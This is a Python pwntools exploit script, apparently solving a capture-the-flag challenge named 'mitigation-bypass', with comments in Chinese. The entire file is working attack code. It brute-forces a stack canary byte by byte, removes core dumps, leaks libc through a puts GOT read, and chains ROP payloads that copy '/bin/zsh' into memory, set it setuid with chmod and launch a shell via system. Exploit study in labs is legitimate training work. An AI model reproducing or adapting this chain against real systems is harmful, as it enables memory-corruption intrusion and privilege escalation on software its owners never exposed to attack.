#!/usr/bin/env python

import os
from pwn import *

# context.log_level = "debug"

proc = process("/challenge/mitigation-bypass")
# proc = process("./mitigation-bypass")

payload0 = cyclic(0x68)  # buf
# byte_by_byte爆破stack_canary
for i in range(8):
    for stack_canary in range(0x100):
        tmp_payload = payload0 + stack_canary.to_bytes(1, byteorder="little")
        proc.sendafter(b"Input something to pwn me :)\n", tmp_payload)
        line = proc.recvline()
        if (line == b"have fun\n"):
            # 猜中了一位，继续下一位
            print("{} byte : {}".format(i, hex(stack_canary)))
            payload0 += stack_canary.to_bytes(1, byteorder="little")
            break

print(payload0)
print(hex(len(payload0)))
payload0 += cyclic(0x8)  # saved_rbp

# 删除产生的core文件
os.system("rm -rf core.*")

# 利用puts输出got表，泄漏出libc地址
pop_rdi_addr = 0x4013e3 # pop rdi; ret
puts_addr = 0x4010C0
puts_got_addr = 0x404020
libc_puts_offset = 0x84420
read_input_addr = 0x4012A2

payload = payload0
payload += p64(pop_rdi_addr)
payload += p64(puts_got_addr) # rdi = puts_got

payload += p64(puts_addr) # puts(puts_got)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)
data = proc.readline()[:-1]
print(data)
libc_base = int.from_bytes(data, byteorder="little") - libc_puts_offset
print("libc addr : ", hex(libc_base))

# gadgets
pop_rdi_offset = 0x23b6a # pop rdi; ret
pop_rsi_offset = 0x2601f # pop rsi; ret
pop_rdx_offset = 0x142c92 # pop rdx; ret
ret_offset = 0x23b6b # ret

buf_offset = 0x1ec780
csh_str_offset = 0x1b5f24 # /bin/csh
z_str_offset = 0x1aa0b4 # 'z'

memcpy_offset = 0xbbad0
chmod_offset = 0x10db60
system_offset = 0x52290

new_mode = 0b1000100111101101 # rwxs r_x r_x


# 由于长度有限，需要多次打入payload

# 第一步，将'/bin/csh'复制到缓冲区
payload = payload0
payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x8) # rdx=8

payload += p64(pop_rsi_offset+libc_base)
payload += p64(csh_str_offset+libc_base) # rsi="/bin/csh"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi=buf

payload += p64(memcpy_offset+libc_base) # memcpy(buf, "/bin/csh", 8)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)


# 第二步，将'z'复制到缓冲区 拼接'/bin/zsh'
payload = payload0
payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x1) # rdx=1

payload += p64(pop_rsi_offset+libc_base)
payload += p64(z_str_offset+libc_base) # rsi="z"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base+5) # rdi=buf+5

payload += p64(memcpy_offset+libc_base) # memcpy(buf+5, "z", 1)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)


# 第三步，chmod修改zsh权限 system开启shell
payload = payload0
payload += p64(pop_rsi_offset+libc_base)
payload += p64(new_mode) # rsi=new_mode

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi="/bin/zsh"

payload += p64(chmod_offset+libc_base) # chmod("/bin/zsh", new_mode)
payload += p64(system_offset+libc_base) # system("/bin/zsh")

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)

proc.interactive()
